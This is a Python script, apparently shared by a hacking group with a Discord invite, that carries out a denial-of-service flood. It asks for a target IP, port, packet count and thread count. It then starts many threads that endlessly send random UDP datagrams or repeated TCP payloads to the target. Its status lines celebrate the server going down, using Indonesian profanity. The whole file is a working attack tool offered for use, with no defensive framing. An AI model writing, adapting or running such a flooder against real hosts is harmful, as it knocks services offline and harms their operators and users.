#!/usr/bin/env python3
#Ddos by XalBadoR
#Join My T3Am : https://discord.gg/fRDAvXsU
import random
import socket
import threading
import os

os.system("clear")
print("--> Autor : Xalbador  Code : XLBDR <--")
print("-->        Dd0s By Xalbador <--")
print("#--        LEVRINCE NIH BOSS --#")
ip = str(input(" LevrinceGanteng Ip:"))
port = int(input(" LevrinceGanteng Port:"))
choice = str(input(" LevrinceGanteng Gas Gak Ni?(y/n):"))
times = int(input(" LevrinceGanteng Packets:"))
threads = int(input(" LevrinceGanteng Threads:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Levrince nih bos!!!")
		except:
			print("[!] Server down kontol!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Levrince nih bos!!!")
		except:
			s.close()
			print("[*] Down lagi kontol")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
